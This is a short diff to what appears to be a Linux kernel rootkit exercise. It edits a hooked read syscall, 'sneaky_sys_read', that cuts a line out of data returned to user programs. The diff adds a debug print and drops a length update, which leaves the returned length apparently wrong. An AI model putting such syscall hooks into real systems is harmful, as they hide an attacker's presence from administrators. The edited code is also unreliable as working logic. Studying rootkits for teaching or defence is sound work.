@@ -93,8 +93,9 @@ asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
     char * line_end = strchr((char *)(regs->si), '\n');
     char * src = line_end + 1;
     size_t remain_len = strlen(src) + 1;
+    size_t remaining = src - dest;
+    printk(KERN_INFO "Remain length is %ld, %ld",remain_len, total_len - remaining);
     memmove(dest, src, remain_len);
-    total_len = remain_len;
   }
   return total_len;
 }
